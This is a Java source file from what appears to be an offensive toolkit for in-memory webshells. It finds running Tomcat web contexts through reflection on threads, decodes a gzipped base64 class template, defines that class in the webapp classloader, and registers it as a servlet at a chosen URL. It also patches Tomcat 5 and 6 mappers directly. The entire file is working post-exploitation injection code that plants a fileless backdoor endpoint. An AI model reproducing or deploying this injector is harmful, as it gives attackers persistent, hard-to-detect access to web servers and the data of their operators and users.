package com.reajason.javaweb.memshell.injector.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/15
 */
public class TomcatServletInjector {

    private String msg = "";
    private static boolean ok = false;

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public TomcatServletInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            } else if (thread.getContextClassLoader() != null) {
                String name = thread.getContextClassLoader().getClass().getSimpleName();
                if (name.matches(".+WebappClassLoader")) {
                    Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
                    // need WebResourceRoot not DirContext
                    if (resources != null && resources.getClass().getName().endsWith("Root")) {
                        Object context = getFieldValue(resources, "context");
                        contexts.add(context);
                    }
                }
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object servlet) throws Exception {
        if (invokeMethod(context, "findServletMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
            return;
        }
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> containerClass = contextClassLoader.loadClass("org.apache.catalina.Container");

        Object wrapper = invokeMethod(context, "createWrapper", null, null);
        invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(wrapper, "setLoadOnStartup", new Class[]{Integer.TYPE}, new Object[]{1});
        setFieldValue(wrapper, "instance", servlet);
        invokeMethod(wrapper, "setServletClass", new Class[]{String.class}, new Object[]{this.getClassName()});
        invokeMethod(context, "addChild", new Class[]{containerClass}, new Object[]{wrapper});

        try {
            invokeMethod(context, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), getClassName()});
        } catch (Exception var11) {
            invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
        }
        support56Inject(context, wrapper);
    }

    @Override
    public String toString() {
        return msg;
    }

    private void support56Inject(Object context, Object wrapper) throws Exception {
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> serverInfo = contextClassLoader.loadClass("org.apache.catalina.util.ServerInfo");
        String number = (String) invokeMethod(serverInfo, "getServerNumber", null, null);
        if (!number.startsWith("5") && !number.startsWith("6")) {
            return;
        }
        Object connectors = getFieldValue(getFieldValue(getFieldValue(getFieldValue(context, "parent"), "parent"), "service"), "connectors");
        int connectorsLength = Array.getLength(connectors);
        for (int i = 0; i < connectorsLength; ++i) {
            Object connector = Array.get(connectors, i);
            String protocolHandlerClassName = (String) getFieldValue(connector, "protocolHandlerClassName");
            if (!protocolHandlerClassName.contains("Http")) {
                continue;
            }
            Object contexts = getFieldValue(getFieldValue(Array.get(getFieldValue(getFieldValue(connector, "mapper"), "hosts"), 0), "contextList"), "contexts");
            int contextsLength = Array.getLength(contexts);
            for (int j = 0; j < contextsLength; ++j) {
                Object o = Array.get(contexts, j);
                if (getFieldValue(o, "object") != context) {
                    continue;
                }
                Class<?> mapperClazz = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper");
                Class<?> wrapperClazz = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper$Wrapper");
                Constructor<?> declaredConstructor = wrapperClazz.getDeclaredConstructors()[0];
                declaredConstructor.setAccessible(true);
                Object newWrapper = declaredConstructor.newInstance();
                setFieldValue(newWrapper, "object", wrapper);
                setFieldValue(newWrapper, "jspWildCard", false);
                setFieldValue(newWrapper, "name", getUrlPattern());

                Object exactWrappers = getFieldValue(o, "exactWrappers");
                int length = Array.getLength(exactWrappers);
                Object newWrappers = Array.newInstance(wrapperClazz, length + 1);
                Class<?> mapElementClass = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper$MapElement");
                Class<?> mapElementArrayClass = Array.newInstance(mapElementClass, 0).getClass();
                invokeMethod(mapperClazz, "insertMap", new Class[]{mapElementArrayClass, mapElementArrayClass, mapElementClass}, new Object[]{exactWrappers, newWrappers, newWrapper});
                setFieldValue(o, "exactWrappers", newWrappers);
            }
        }
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
